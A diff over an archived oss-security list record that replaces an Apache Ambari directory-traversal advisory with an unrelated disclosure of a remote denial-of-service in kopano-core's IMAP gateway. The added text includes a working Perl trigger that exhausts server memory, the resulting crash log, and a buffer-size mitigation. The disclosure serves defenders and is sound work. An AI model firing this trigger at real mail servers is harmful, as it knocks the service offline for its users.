@@ -1,18 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/07/1
-Message-ID: <CAEJYuxGBZfg_erJDPG9d0waU2jLqkG2tTrtHg-gXCoaaKF1M4Q@mail.gmail.com>
-Date: Sun, 7 Feb 2021 12:30:19 +0100
-From: Szabolcs Beki <szabolcs.beki@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/01/1
+Message-ID: <p883nn87-4nrq-8060-88p-70o27nr6n0r2@inai.de>
+Date: Sat, 1 May 2021 17:07:37 +0200 (CEST)
+From: Jan Engelhardt <jengelh@...i.de>
 To: oss-security@...ts.openwall.com
-Subject: [CVE-2020-13924] Apache Ambari Arbitrary File Download Vulnerability
+Subject: kopano-core 11.0.1.143: Remote DoS with resource exhaustion
 Content-Type: text/plain; charset=utf-8
 
-[CVEID]:CVE-2020-13924
-[PRODUCT]:Apache Ambari
-[VERSION]:All 2.6.x and before
-[PROBLEMTYPE]:Information Disclosure
-[REFERENCES]:
-https://mail-archives.apache.org/mod_mbox/ambari-user/202102.mbox/%3CCAEJYuxEQZ_aPwJdAaSxPu-Dva%3Dhc7zZUx3-pzBORbd23g%2BGH1A%40mail.gmail.com%3E
-[DESCRIPTION]:Malicious users can construct file names for directory
-traversal and traverse to other directories to download files.
 
+To the best of my knowledge, this is the initial publication,
+and there is no CVE number as of this time.
+
+
+# Affected versions
+
+  * kopano-core 8.5 to 11.0.1.143
+
+The "kopano-gateway" program implements a network service for IMAP.
+By default, a generous buffer is allocated for string literals, so
+the service can be triggered to go into an out-of-memory condition.
+OOM appears to be handled (log msg with "Cannot allocate memory"),
+but not _consistently_, letting std::bad_alloc escape somewhere,
+terminating the process and denying further access to the service.
+
+
+# Trigger
+
+» ./kopano-gateway -F &
+» perl -MIO::Socket::INET -e 
+  '$a="A"x65536;for(1..99){$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,143);
+  $s->write("K {134217727}\r\n");$s->write($a) for 1..2048;push@k,$s;}'
+
+2021-05-01T17:00:03.424598: [error  ] Failed to read line: Cannot allocate memory
+2021-05-01T17:00:40.489165: [crit   ] ----------------------------------------------------------------------
+2021-05-01T17:00:40.489174: [crit   ] Fatal error detected. Please report all following information.
+2021-05-01T17:00:40.489186: [crit   ] kopano-dagent 11.0.1
+2021-05-01T17:00:40.489210: [crit   ] OS: openSUSE Tumbleweed (Linux 5.12.0-3.g6208a83-default x86_64)
+2021-05-01T17:00:40.489217: [crit   ] Thread name: kopano-gateway
+2021-05-01T17:00:40.489429: [crit   ] Peak RSS: 3056660
+2021-05-01T17:00:40.489444: [crit   ] Pid 31604 caught SIGABRT (6), out of memory or unhandled exception, traceback:
+terminate called after throwing an instance of 'std::bad_alloc'
+  what():  std::bad_alloc
+
+
+# Mitigation
+
+A reduction of the buffer (gateway.cfg:imap_max_messagesize) is 
+possible, but this administrative action equally implies a reduction of 
+the service capabilities offered to end-users (and may be unpopular).
